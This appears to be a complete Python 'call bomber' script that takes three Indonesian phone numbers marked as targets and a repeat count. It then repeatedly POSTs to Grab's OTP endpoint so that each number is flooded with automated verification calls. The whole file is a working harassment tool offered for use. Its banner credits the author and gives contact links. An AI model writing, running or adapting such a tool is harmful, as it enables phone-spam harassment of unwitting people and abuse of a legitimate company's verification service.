#!/usr/bin/python
# -*- coding: utf-8 -*-
# Coded by hizkan4tic
"""
Hi >_<
"""

try:
	import os, requests, time
except ModuleNotFoundError:
	print("\nIt seems like the module requests have NOT been installed")
	print("$ pip install requests\n")
	exit()

os.system('clear')
c=('\033[1;36m')
r=('\033[1;31m')
g=('\033[1;32m')
w=('\033[1;37m')
print("""%s
			SPAM CALL V.1.0%s
 ,_     _‚
 |\\\___//|	%sAuthor: hizkan4tic%s
 |=6   6=|	%sContact: https://instagram.com/hizqilhkm%s
 \=._Y_.=/	%sGithub: https://github.com/hizkan4tic%s
  )  `  (    ,	%sTEAM: NO TEAM%s
 /       \  ((
 |       |   ))
/| |   | |\_//	%sENTER NUMBER WITH "62" (EX: 628XXXXXX)%s
\| |._.| |/-’
 '"'   '"'
<NOTE> If there is an ERROR or BUG and others, please contact me"""%(c,r,g,r,g,r,g,r,g,r,w,r))
print("%s[*] Click ENTER%s"%(g,g))
no1 = input("[?] NO TARGET 1 => %s"%(w))
no2 = input("%s[?] NO TARGET 2 => %s"%(g,w))
no3 = input("%s[?] NO TARGET 3 => %s"%(g,w))
jlmh=int(input("%s[?] Amount of Spam => %s"%(g,w)))
dt1={'method':'CALL','countryCode':'id','phoneNumber':no1,'templateID':'pax_android_production'}
dt2={'method':'CALL','countryCode':'id','phoneNumber':no2,'templateID':'pax_android_production'}
dt3={'method':'CALL','countryCode':'id','phoneNumber':no3,'templateID':'pax_android_production'}

try:
	print()
	print("%s[-] RESULT:%s"%(r,w))
	for i in range(jlmh):
		print("[!] WAIT DEAR...")
		idk=("challengeID")
		r1 = requests.post('https://api.grab.com/grabid/v1/phone/otp',data=dt1)
		r2 = requests.post('https://api.grab.com/grabid/v1/phone/otp',data=dt2)
		r3 = requests.post('https://api.grab.com/grabid/v1/phone/otp',data=dt3)
		if str(idk) in str(r1.text):
			print("[+] TARGET1 SUCCES")
		else:
			print("[-] TARGET1 FAILED")
		if str(idk) in str(r2.text):
			print("[+] TARGET2 SUCCES")
		else:
			print("[-] TARGET2 FAILED")
		if str(idk) in str(r3.text):
			print("[+] TARGET3 SUCCES")
		else:
			print("[-] TARGET3 FAILED")
		print("="*30)
		time.sleep(1)
except KeyboardInterrupt:
	print("%see you again..."%(c))
